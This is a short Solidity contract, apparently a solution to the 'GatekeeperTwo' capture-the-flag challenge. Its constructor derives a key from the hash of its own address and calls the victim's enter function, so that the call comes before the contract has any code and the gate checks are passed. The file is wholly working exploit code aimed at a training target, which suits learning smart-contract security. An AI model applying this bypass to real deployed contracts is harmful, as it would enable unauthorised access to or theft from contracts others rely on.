pragma solidity ^0.8.10;

contract AttackGatekeeperTwo {
    address public victim;

    constructor(address _victim) {
        victim = _victim;
        bytes8 _key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (type(uint64).max)); 
        bytes memory payload = abi.encodeWithSignature("enter(bytes8)", _key);
        (bool success,) = victim.call(payload);
        require(success, "failed");
    }
}